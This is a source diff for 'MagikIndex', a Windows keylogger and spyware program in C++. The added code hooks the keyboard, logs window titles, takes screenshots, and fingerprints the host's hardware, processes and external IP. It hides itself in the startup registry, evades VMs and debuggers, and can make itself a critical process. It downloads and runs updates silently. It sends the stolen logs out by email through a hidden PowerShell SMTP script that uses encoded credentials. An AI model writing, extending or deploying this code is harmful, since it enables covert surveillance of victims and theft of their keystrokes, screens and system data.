@@ -1,68 +1,63 @@
 #include "common.h"
 #include "logo.h"
 
-//#include "lz4/lz4.h"
-//#include <Wbemidl.h>
-//#include <wbemcli.h>
-
-
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
-typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
-PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
+int Counter, Counter2;
+bool mutex, mutex2;
+Log MyLog;
 
 
-HHOOK keyboardHook;
-
-int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
-
-
-    FreeConsole();
 
     CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         exit(0);
     }
 
+    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
+
+
     DWORD Tick1 = GetTickCount();
-
     int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();
-
     srand(RandSeed);
 
+    bool ThrowAwayFlag = false;
     char PathToFile[MAX_PATH];
     HMODULE GetModH = GetModuleHandle(NULL);
     GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
-    if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {
+    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
+    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
+    /*if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {      //why did i put this here kekw
         RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
         exit(0);
-    }
-#ifndef debug
-
-    unsigned long ThreadId;
-    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
-
-
-#endif
+    }*/
 
     if (DelayExecution) {
-        int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
-        LARGE_INTEGER delay;
-        delay.QuadPart = -10000 * (DividedSleep * 1000);
-        pNtDelayExecution(FALSE, &delay);
+        int Divider = 20 , DividedSleep = (DelayTime + rand()%100+10) / Divider;
+        //LARGE_INTEGER delay;
+        //delay.QuadPart = -10000 * (DividedSleep * 1000);
+        //pNtDelayExecution(FALSE, &delay);
         for (int j = 0; j <= Divider; j++) {
             Sleep(DividedSleep);
         }
     }
 
+    if (ShatterAttack) {
+        unsigned long ThreadId;
+        CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
+    }
+
     bool FirstLog = true;
+    if (ScreenGrab) {
+        unsigned long ThreadId2;
+        CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
+    }
 
-    unsigned long ThreadId2;
-    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);
-
-    //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
+    __AsmImpossibleDisassm();
+    __AsmJmpSameTarget();
 
     AntiDBG DebugItem;
     DebugItem.Initialize();
@@ -70,19 +65,68 @@ int main()
     bool TrustTooLow = false;
     if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
         if (QuitIfUntrust) {
-            FinalExit();
+            exit(0);
         }
         TrustTooLow = true;                                         
+    }else if (Trust.HasActiveInternet && !Trust.IsInVM) {
+        std::string VersionFile = CurrentDir + "\\Version.inf";
+        std::string UpdatedExe = CurrentDir + "\\MagikIndekkusu.exe";
+        std::string UpdateLink;
+        VersionDownload:
+        URLDownloadToFileA(NULL, HardDecode(GitVersionLink).c_str(), VersionFile.c_str(), 0, NULL);
+        SetFileAttributesA(VersionFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
+        std::ifstream VersionFileIO(VersionFile);
+        if (!VersionFileIO.eof()) {
+            std::getline(VersionFileIO, UpdateLink, '\n');
+            //VersionFile.erase(VersionFile.size() - 1);
+            if (strcmp(UpdateLink.c_str(), CurrentVersion ) != 0) {
+                std::getline(VersionFileIO, UpdateLink, '\n');
+                URLDownloadToFile(NULL, UpdateLink.c_str(), UpdatedExe.c_str(), 0, NULL);
+                SetFileAttributesA(UpdatedExe.c_str(), FILE_ATTRIBUTE_HIDDEN); 
+                VersionFileIO.close();
+                DeleteFileA(VersionFile.c_str());
+                VersionFile = "/C timeout 3 /nobreak > Nul & start " + UpdatedExe;
+                ShellExecuteA(0, "open", "cmd.exe", VersionFile.c_str(), 0, SW_HIDE);
+                FinalExit();
+            }
+            else {
+                VersionFileIO.close();
+                DeleteFileA(VersionFile.c_str());
+            }
+        }else {
+            VersionFileIO.close();
+            DeleteFileA(VersionFile.c_str());
+            if (!ThrowAwayFlag) {
+                ThrowAwayFlag = true;
+                VersionFileIO.close();
+                goto VersionDownload;
+            }
+            VersionFileIO.close();
+        }
     }
-    //add special security routines, example:
-    // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
-    // or
-    // if( classic sandbox parameters ){ act like a normal program to evade detection }
+
+    if (IsElevated()) {
+        HANDLE hToken;
+        LUID luid;
+        LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid);
+        TOKEN_PRIVILEGES tp;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        tp.PrivilegeCount = 1;
+        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+        AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
+        HANDLE ntdll = LoadLibrary("ntdll.dll");
+        RtlSetProcessIsCritical SetCriticalProcess;
+        SetCriticalProcess = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
+        SetCriticalProcess(TRUE, NULL, FALSE);
+    }
 
 Log:
 
-    Log log;
-    log.CreateLog();
+    Counter = 0;
+    mutex = false;
+
+    MyLog.CreateLog();
 
     DWORD Tick = GetTickCount();
 
@@ -90,6 +134,7 @@ Log:
     std::string TimeText = "Current Tick:";
     std::string ComputerText = "Host Name:";
     std::string UsernameText = "User Name:";
+    std::string PrivilegeText = "Privilege:";
     std::string InternetText = "Internet Status:";
     std::string WidthText = "Screen Width:";
     std::string HeightText = "Screen Height:";
@@ -110,14 +155,18 @@ Log:
     std::string RAMText = "RAM Size:";
     std::string SeedText = "Randomness Seed:";
     std::string CopiedFileText = "Made executable \"";
-    std::string CryptText = "Encrypted with \"";
+    std::string CryptText = "Encrypted with ";
+    std::string DiskText = "Found partitions:\n";
+    std::string IPText = "External IP:";
+    std::string OSText = "OS Name:";
+    std::string ManufacturerText = "Manufacturer:";
+    std::string InstallDateText = "Install Date:";
+    std::string SystemDeviceText = "System Device:";
+    std::string MotherBoardText = "Motherboard:";
+    std::string BIOSText = "BIOS:";
+    std::string HDDText = "Hard Disk:";
 
-    std::string NormalizedVersion = std::to_string(CurrentVersion);
-    for (int i = 0; i < 4; i++) {
-        if (i == 3 && NormalizedVersion[3] == '0')
-            break;
-        VersionText += NormalizedVersion[i];
-    }
+    VersionText += CurrentVersion;
     if (IsMajor)
         VersionText += " Major Release - ";
     else
@@ -148,60 +197,56 @@ Log:
     StartDate += std::to_string(SysTime.wSecond);
     StartDate += "_________\n";
 
-    log.LogItChar(MyLogo);
-    log.LogItChar("\n");
-    log.LogItChar(StartDate);
+    MyLog.LogItChar(MyLogo);
+    MyLog.LogItChar("\n");
+    MyLog.LogItChar(StartDate);
 
-#ifdef debug
-
-    log.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
-    log.LogItChar("Not crypting the logs...");
-
-#else
-
-    log.LogItChar("Started in normal mode...");
-    CryptText += "Secure Random Key Shift...";
-    log.LogItChar(CryptText);
-
-#endif
+    if (!CryptLogs) {
+        MyLog.LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#");
+        MyLog.LogItChar("Not crypting the logs...");
+    }else{
+        MyLog.LogItChar("Started in normal mode...");
+        CryptText += "Secure Random Key Shift...";
+        MyLog.LogItChar(CryptText);
+    }
 
     if (FirstLog) {
         if (Trust.IsResCheck)
-            log.LogItChar("Resolution ratio mismatch, trust decreased...");
+            MyLog.LogItChar("Resolution ratio mismatch, trust decreased...");
         if (Trust.IsInVM)
-            log.LogItChar("VM Guest specific files found, trust decreased...");
+            MyLog.LogItChar("VM Guest specific files found, trust decreased...");
         if (Trust.IsHostingAVM)
-            log.LogItChar("VM Host specific files found, trust increased...");
+            MyLog.LogItChar("VM Host specific files found, trust increased...");
         if (Trust.IsSmallHardDrive)
-            log.LogItChar("HardDrive is under the set minimum, trust decreased...");
+            MyLog.LogItChar("HardDrive is under the set minimum, trust decreased...");
         if (Trust.IsSmallRAM)
-            log.LogItChar("RAM is under the set minimum, trust decreased...");
+            MyLog.LogItChar("RAM is under the set minimum, trust decreased...");
         if (Trust.IsBeingDebugged)
-            log.LogItChar("Process is being debugged, trust decreased...");
+            MyLog.LogItChar("Process is being debugged, trust decreased...");
         if (Trust.HasOneCore)
-            log.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
+            MyLog.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
         if (Trust.HasMultipleMonitors)
-            log.LogItChar("Multiple monitor setup found, trust increased...");
+            MyLog.LogItChar("Multiple monitor setup found, trust increased...");
         if (Trust.HasBeenTimepatched)
-            log.LogItChar("Process has been timepatched, trust decreased...");
+            MyLog.LogItChar("Process has been timepatched, trust decreased...");
         if (Trust.UserIsInactive)
-            log.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
+            MyLog.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
         if (Trust.HasActiveInternet)
-            log.LogItChar("Active internet connection found, trust increased...");
+            MyLog.LogItChar("Active internet connection found, trust increased...");
         if (Trust.Proxied)
-            log.LogItChar("Proxy/Fake connection found, trust decreased...");
+            MyLog.LogItChar("Proxy/Fake connection found, trust decreased...");
         if (Trust.HasRunningAntiMalware)
-            log.LogItChar("Running Anti-Malware solution found, trust increased...");
+            MyLog.LogItChar("Running Anti-Malware solution found, trust increased...");
         if (Trust.HasMoreThan20Apps)
-            log.LogItChar("More than 20 apps installed, trust increased...");
+            MyLog.LogItChar("More than 20 apps installed, trust increased...");
         if (Trust.ExtUserActivity)
-            log.LogItChar("No user input in the past 15s, trust decreased...");
+            MyLog.LogItChar("No user input in the past 15s, trust decreased...");
     }
 
     if (TrustTooLow) {
-        log.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
-        log.LogItChar("Trust factor too low, quitting...");
-        log.SendLog();
+        MyLog.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
+        MyLog.LogItChar("Trust factor too low, quitting...");
+        MyLog.SendLog();
         FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
     }
 
@@ -230,7 +275,7 @@ Log:
 
     if (FirstLog) {
 
-        log.LogItChar("First log of the session, copying files and adding to startup...");
+        MyLog.LogItChar("First log of the session, copying files and adding to startup...");
 
         std::string DestinationFile = "C:\\Users\\";
         DestinationFile += UserName;
@@ -242,11 +287,8 @@ Log:
         SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
         if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
-            std::string Command = "/C del /f /q ";
-            Command += DestinationFile;
-            Command += "\\*.*";
-            ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
-            log.LogItChar("Cleaned MagikIndex folder...");
+            DeleteDirectory(DestinationFile);
+            MyLog.LogItChar("Cleaned MagikIndex folder...");
             Sleep(200);
         }
         DestinationFile += "\\";
@@ -266,14 +308,14 @@ Log:
 
         CopiedFileText += CopiedFile;
         CopiedFileText += ".exe\"...";
-        log.LogItChar(CopiedFileText);
+        MyLog.LogItChar(CopiedFileText);
 
-        RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
+        CreateRegistryKey("MagikIndex", DestinationFile.c_str());
 
-        log.LogItChar("Registered executable for startup...");
+        MyLog.LogItChar("Registered executable for startup...");
 
     }else{
-        log.LogItChar("Not the first log of the session, skip copying files...");
+        MyLog.LogItChar("Not the first log of the session, skip copying files...");
     }
 
     int x1, y1, x2, y2, w, h, mo, mb;
@@ -292,7 +334,13 @@ Log:
     std::string Monitors = std::to_string(mo);
     std::string MouseButtons = std::to_string(mb);
     std::string BootMode = "Yes";
-
+    PBYTE WKSTAPointer;
+    WKSTA_INFO_100 WKSTABuf;
+    NetWkstaGetInfo(NULL, 100, &WKSTAPointer);
+    memcpy(&WKSTABuf, WKSTAPointer, sizeof(WKSTABuf));
+    WindowsVersion = WKSTABuf.wki100_ver_major;
+    WindowsVersion += ".";
+    WindowsVersion += WKSTABuf.wki100_ver_minor;
     if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
         BootMode = "No";
     }
@@ -355,132 +403,240 @@ Log:
         }
     }
 
-    char Locale[LOCALE_NAME_MAX_LENGTH+1];
+    char LanguageIdentifier[100];
+    char CurrIdentifier[100];
+    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGLANGUAGE, LanguageIdentifier, sizeof(LanguageIdentifier));
+    GetLocaleInfo(GetSystemDefaultUILanguage(), LOCALE_SENGCURRNAME, CurrIdentifier, sizeof(CurrIdentifier));
 
-    GetCurrencyFormatA(
-        LOCALE_SYSTEM_DEFAULT, 
-        LOCALE_NOUSEROVERRIDE,
-        "0",
-        NULL,
-        Locale,
-        LOCALE_NAME_MAX_LENGTH);
+    if (IsElevated())
+        PrivilegeText += "Elevated";
+    else
+        PrivilegeText += "Standard";
 
     TimeText += LogTime;
-    log.LogItChar(TimeText);
+    MyLog.LogItChar(TimeText);
 
     ComputerText += HostName;
-    log.LogItChar(ComputerText);
+    MyLog.LogItChar(ComputerText);
 
     UsernameText += UserName;
-    log.LogItChar(UsernameText);
+    MyLog.LogItChar(UsernameText);
+
+    OSText += QueryVMI("SELECT * FROM Win32_OperatingSystem", L"Caption");
+    MyLog.LogItChar(OSText);
+
+    ManufacturerText += QueryVMI("SELECT * FROM Win32_OperatingSystem", L"Manufacturer");
+    MyLog.LogItChar(ManufacturerText);
+
+    InstallDateText += QueryVMI("SELECT * FROM Win32_OperatingSystem", L"InstallDate");
+    MyLog.LogItChar(InstallDateText);
+
+    SystemDeviceText += QueryVMI("SELECT * FROM Win32_OperatingSystem", L"SystemDevice");
+    MyLog.LogItChar(SystemDeviceText);
+
+    MotherBoardText += QueryVMI("SELECT * FROM Win32_BaseBoard", L"Manufacturer");
+    MotherBoardText += " ";
+    MotherBoardText += QueryVMI("SELECT * FROM Win32_BaseBoard", L"Product");
+    MotherBoardText += " ";
+    MotherBoardText += QueryVMI("SELECT * FROM Win32_BaseBoard", L"Version");
+    MotherBoardText += " ";
+    MotherBoardText += QueryVMI("SELECT * FROM Win32_BaseBoard", L"SerialNumber");
+    MyLog.LogItChar(MotherBoardText);
+
+    BIOSText += QueryVMI("SELECT * FROM Win32_BIOS", L"Manufacturer");
+    BIOSText += " ";
+    BIOSText += QueryVMI("SELECT * FROM Win32_BIOS", L"Name");
+    BIOSText += " ";
+    BIOSText += QueryVMI("SELECT * FROM Win32_BIOS", L"SerialNumber");
+    MyLog.LogItChar(BIOSText);
+
+    HDDText += " Model:";
+    HDDText += QueryVMI("SELECT * FROM Win32_DiskDrive", L"Model");
+    HDDText += " Path:";
+    HDDText += QueryVMI("SELECT * FROM Win32_DiskDrive", L"Name");
+    HDDText += " SN:";
+    HDDText += QueryVMI("SELECT * FROM Win32_DiskDrive", L"SerialNumber");
+    HDDText += " Size:";
+    HDDText += QueryVMI("SELECT * FROM Win32_DiskDrive", L"Size");
+    HDDText += "Bytes";
+    MyLog.LogItChar(HDDText);
 
     InternetText += InternetStatusString;
-    log.LogItChar(InternetText);
+    MyLog.LogItChar(InternetText);
+
+    if (Trust.HasActiveInternet)
+        IPText += RetrieveExternalIp(CurrentDir);
+    else
+        IPText += "Offline";
+    MyLog.LogItChar(IPText);
 
     WidthText += Width;
-    log.LogItChar(WidthText);
+    MyLog.LogItChar(WidthText);
 
     HeightText += Height;
-    log.LogItChar(HeightText);
+    MyLog.LogItChar(HeightText);
 
     AspectRatioText += std::to_string(Ratioed);
-    log.LogItChar(AspectRatioText);
+    MyLog.LogItChar(AspectRatioText);
 
     WindowsText += WindowsVersion;
-    log.LogItChar(WindowsText);
+    MyLog.LogItChar(WindowsText);
 
     OEMText += OEMNumber;
-    log.LogItChar(OEMText);
+    MyLog.LogItChar(OEMText);
 
     RAMText += RAMAmount;
     RAMText += " MB";
-    log.LogItChar(RAMText);
+    MyLog.LogItChar(RAMText);
 
     CPUNumberText += CPUCores;
-    log.LogItChar(CPUNumberText);
+    MyLog.LogItChar(CPUNumberText);
 
     CPUTypeText += CPUType;
-    log.LogItChar(CPUTypeText);
+    MyLog.LogItChar(CPUTypeText);
 
     CPUBrand += GetCpuInfo();
-    log.LogItChar(CPUBrand);
+    MyLog.LogItChar(CPUBrand);
 
     GenuineText += IsGenuine;
-    log.LogItChar(GenuineText);
+    MyLog.LogItChar(GenuineText);
 
     MouseText += MouseButtons;
-    log.LogItChar(MouseText);
+    MyLog.LogItChar(MouseText);
 
     MonitorText += Monitors;
-    log.LogItChar(MonitorText);
+    MyLog.LogItChar(MonitorText);
 
     BootText += BootMode;
-    log.LogItChar(BootText);
+    MyLog.LogItChar(BootText);
 
     SlowText += SlowMachine;
-    log.LogItChar(SlowText);
+    MyLog.LogItChar(SlowText);
 
-    LanguageText += GetSystemDefaultUILanguage();
-    log.LogItChar(LanguageText);
+    LanguageText += LanguageIdentifier;
+    MyLog.LogItChar(LanguageText);
 
-    CurrencyText += Locale;
-    log.LogItChar(CurrencyText);
+    CurrencyText += CurrIdentifier;
+    MyLog.LogItChar(CurrencyText);
 
     MiddleEastText += MiddleEast;
-    log.LogItChar(MiddleEastText);
+    MyLog.LogItChar(MiddleEastText);
 
     SeedText += std::to_string(RandSeed);
-    log.LogItChar(SeedText);
+    MyLog.LogItChar(SeedText);
+
+    DWORD DriveMask = GetLogicalDrives();
+
+    for (int i = 0; i < 26; i++) {
+        std::string DriveLetter = {};
+        DriveLetter += (char)(i + (int)'A');
+        DriveLetter += ":\\";
+        ULARGE_INTEGER DiskSize;
+        UINT DriveType = GetDriveTypeA(DriveLetter.c_str());
+        //MessageBoxA(NULL,std::to_string(DriveType).c_str(), DriveLetter.c_str(),MB_OK);
+        if ((DriveMask & (1 << i))) {
+            if (DriveType != DRIVE_UNKNOWN && DriveType != DRIVE_NO_ROOT_DIR) {
+                if (GetDiskFreeSpaceExA(DriveLetter.c_str(), NULL, &DiskSize, NULL) || (DriveType != DRIVE_CDROM && DriveType != DRIVE_REMOVABLE)) {
+                    DiskText += (char)(i + (int)'A');
+                    DiskText += ":\\  Type:";
+                    DiskText += std::to_string(DriveType);
+                    DiskText += "  Size:";
+                    DiskText += std::to_string((DiskSize.QuadPart / 1073741824));
+                    DiskText += "GB,\n";
+                    DiskSize.QuadPart = 0;
+                }
+            }
+        }
+    }
+    DiskText.erase(DiskText.size()-2);
+    DiskText += "\n";
+    MyLog.LogItChar(DiskText);
+
+    MyLog.LogItChar("_____________________________________________\nList of running processes: \n");
+
+    HANDLE hpSnap;
+    PROCESSENTRY32 pentry;
+    hpSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hpSnap != INVALID_HANDLE_VALUE) {
+        pentry.dwSize = sizeof(PROCESSENTRY32);
+    }
+    else {
+        return false;
+    }
+    if (!Process32First(hpSnap, &pentry)) {
+        CloseHandle(hpSnap);
+        return false;
+    }
+    do {
+        MyLog.LogItChar(pentry.szExeFile);
+    } while (Process32Next(hpSnap, &pentry));
+
+    MyLog.LogItChar("_____________________________________________\nList of device drivers: \n");
+
+    LPVOID drivers[1024];
+    DWORD cbNeeded;
+    int cDrivers, i;
+    if (K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
+    {
+        char szDriver[1024];
+        cDrivers = cbNeeded / sizeof(drivers[0]);
+        for (i = 0; i < cDrivers; i++)
+        {
+            if (K32GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
+            {
+                MyLog.LogItChar(szDriver);
+            }
+        }
+    }
+    else
+    {
+        MyLog.LogItChar("Not enough memory for driver enumeration.");
+    }
+
+    MyLog.LogItChar("\n_____________________________________________\n");
 
 
-    log.LogItChar("_____________________________________________\n");
+    std::thread t1(Hooker, WH_KEYBOARD_LL, KeyboardThread);
+    std::thread t2(TimerThread);
+    t2.detach();
+    t1.detach();
+    //t1.detach();
+    Sleep(50);
+    char OldWindowTitle[256];
+    char WindowTitle[256];
+    while (!mutex) {
+        GetWindowTextA(GetForegroundWindow(), WindowTitle, sizeof(WindowTitle));
+        if (strcmp(WindowTitle, OldWindowTitle) != 0) {
+            memset(OldWindowTitle, 0, sizeof(OldWindowTitle));
+            strcpy(OldWindowTitle, WindowTitle);
+            std::string ContextSwitchText = "[Switched to \"";
+            ContextSwitchText += WindowTitle;
+            ContextSwitchText += "\"]";
+            MyLog.LogItChar(ContextSwitchText);
+            Counter += ContextSwitchText.size();
+        }
+        Sleep(50);
+    }
+    MyLog.LogItChar("\n_____________________________________________\n");
+    if (LogMode == 2)
+        MyLog.LogItChar("Character limit hit, sending log...");
+    else if (LogMode == 1)
+        MyLog.LogItChar("Timer limit hit, sending log...");
 
+    MyLog.SendLog();
+    FirstLog = false;
 
-
-
-
-    int ArraySize = 10;
-
-     int KeyList = {};
-
-
-     for (int k = 0; k < CharactersPerLog;) {
-         Sleep(25);
-         for (int i = 8; i < 190; i++) {
-             if (GetAsyncKeyState(i) == -32767) {
-                 log.LogItInt(i);
-                 k++;
-             }
-         }
-     }
-     /*
-     std::string RemoteFile = "Log";
-     RemoteFile += LogTime;
-     RemoteFile += ".txt";
-     FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
-     */
-
-     log.LogItChar("\n_____________________________________________");
-     log.LogItChar("Character limit hit, sending log...");
-
-     log.SendLog();
-     FirstLog = false;
-
-     goto Log;
-     return 0;
+    goto Log;
+    return 0;
 }
 
-int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
+void DeleteDirectory(std::string dir)
 {
-    int len = (int)strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
-    char* tempdir = (char*)malloc(len);
-    memset(tempdir, 0, len);
-    strcpy(tempdir, dir);
-
+    dir += "\0";
     SHFILEOPSTRUCTA file_op = {
       NULL,
       FO_DELETE,
-      tempdir,
+      dir.c_str(),
       NULL,
       FOF_NOCONFIRMATION |
       FOF_NOERRORUI |
@@ -488,9 +644,8 @@ int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the dire
       false,
       0,
       "" };
-    int ret = SHFileOperationA(&file_op);
-    free(tempdir);
-    return ret; // returns 0 on success, non zero on failure.
+    SHFileOperationA(&file_op);
+    return;
 }
 
 
@@ -510,7 +665,24 @@ void TakeScreenShot(const char* filename) {
     HDC     hDC = CreateCompatibleDC(hScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
     HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+    BOOL    bRet = BitBlt(hDC, x1, y1, w, h, hScreen, x1, y1, SRCCOPY);
+
+    //include mouse pointer inside the screenshot(if it is displayed)
+    HWND hwnd = GetDesktopWindow();
+    CURSORINFO cursor = { sizeof(cursor) };
+    GetCursorInfo(&cursor);
+    if (cursor.flags == CURSOR_SHOWING) {
+        RECT rect;
+        GetWindowRect(hwnd, &rect);
+        ICONINFO info = { sizeof(info) };
+        GetIconInfo(cursor.hCursor, &info);
+        const int x = cursor.ptScreenPos.x - rect.left - rect.left - info.xHotspot;
+        const int y = cursor.ptScreenPos.y - rect.top - rect.top - info.yHotspot;
+        BITMAP bmpCursor = { 0 };
+        GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
+        DrawIconEx(hDC, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight,
+            0, NULL, DI_NORMAL);
+    }
 
     SaveHBITMAPToFile(hBitmap, filename);
     //CLEAN
@@ -626,19 +798,27 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
     DWORD DWFlags;
 
     while (1) {
-        SilentlyRemoveDirectory(ScreenshotDir.c_str());
-        Sleep(60000);
+        DeleteDirectory(ScreenshotDir);
+        std::this_thread::sleep_for(std::chrono::minutes(1));
         CreateDirectoryA(ScreenshotDir.c_str(), NULL);
         SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
-        for (int i = 0; i < ScreenshotsPerZip; i++) {
-            CurrentLog = ScreenshotDir;
-            CurrentLog += "\\ScreenShot";
-            CurrentLog += std::to_string(rand() % 10000 - 1000);
-            CurrentLog += ".png";
+        if (ScreenshotMode == 1) {
+            for (int i = 0; i < ScreenshotsPerZip; i++) {
+                CurrentLog = ScreenshotDir;
+                CurrentLog += "\\ScreenShot";
+                CurrentLog += std::to_string(rand() % 10000 - 1000);
+                CurrentLog += ".png";
 
-            TakeScreenShot(CurrentLog.c_str());
+                TakeScreenShot(CurrentLog.c_str());
 
-            Sleep(SecondsBetweenScreenshots*1000);
+                Sleep(SecondsBetweenScreenshots * 1000);
+            }
+        }else if(ScreenshotMode == 2){
+            std::thread t2(Hooker,WH_MOUSE_LL,MouseThread);
+            while (!mutex2) {
+                std::this_thread::sleep_for(std::chrono::seconds(3));
+            }
+            t2.join();
         }
         std::string ZipPath = ScreenshotDir;
         ZipPath += "\\Zip";
@@ -678,31 +858,34 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
             std::string PSStartup = "MagikMailer";
             PSStartup += std::to_string(GetTickCount());
             HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
-            a += SendersEmail;
+            std::string a = HardDecode("yLqyY[rTpdnTY\\{P2c{;4f2XoVwSZ\\Q7UdnT5e7PHK2PY\\sL4VveZ\\QDURiOJdjnIfwXI\\nL5Sw:o\\wnGWW32WmqS\\3LJfmCURiy4eVXIdkHodH7{do7YUSTXVVTkEreFQ3CEN{Xof{X4WyTZdVTEM27Y\\rz4SyTZdV7EdrHYVwSZ\\QDEflXock;WN5XoVi2FKx\\odLDHXPPHLMeUdxPoNunY[vfoNyTZd|fEK;Cken\\penPHWW32WmqygMmU\\wnIdw;ILqCk\\rrCfnnYfT3EKzCEfwX5dF3EK66EQwilN6CkdxnIflXodw;4[vS5enTJK;CU\\wnIdw;IL");
+            a += HardDecode(SendersEmail);
             a += "', '";
-            a += SendersPsw;
+            a += HardDecode(SendersPsw);
             a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
-            a += SendersEmail;
+            a += HardDecode(SendersEmail);
             a += "'\n$ReportEmail.To.Add('";
-            a += RecieversEmail;
+            a += HardDecode(RecieversEmail);
             a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
             a += ZipPath.c_str();
             a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
             WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
             CloseHandle(PS1File);
-            Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+            Command = SysDir;
+            Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
             Command += Powershell;
             Command += "\"";
             if (!InternetGetConnectedState(&DWFlags, NULL)) {
-                RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
+                CreateRegistryKey(PSStartup.c_str(), Command.c_str());
             }
             else {
                 ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
             }
         }
 
-        Sleep(140000);
+        Counter2 = 0;
+        mutex2 = !mutex2;
+        std::this_thread::sleep_for(std::chrono::minutes(3));
 
     }
 }
@@ -734,44 +917,32 @@ int CalculateDirSize(std::string DirectoryToCheck) {
 }
 
 
-BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
+void CreateRegistryKey(PCSTR AppName, PCSTR PathToExe)
 {
     HKEY hKey = NULL;
-    LONG lResult = 0;
-    BOOL fSuccess = TRUE;
-    DWORD dwSize;
-
-    const size_t count = MAX_PATH * 2;
-    char szValue[count] = {};
-
-
+    char szValue[MAX_PATH] = {};
+    std::string Cmd;
     strcpy_s(szValue, "\"");
-    strcat_s(szValue, pathToExe);
+    strcat_s(szValue, PathToExe);
     strcat_s(szValue, "\" ");
-
-    if (args != NULL)
-    {
-        strcat_s(szValue, args);
+    if (IsElevated()) {
+        Cmd = "/delete  /tn \"";
+        Cmd += AppName;
+        Cmd += "\" /f";
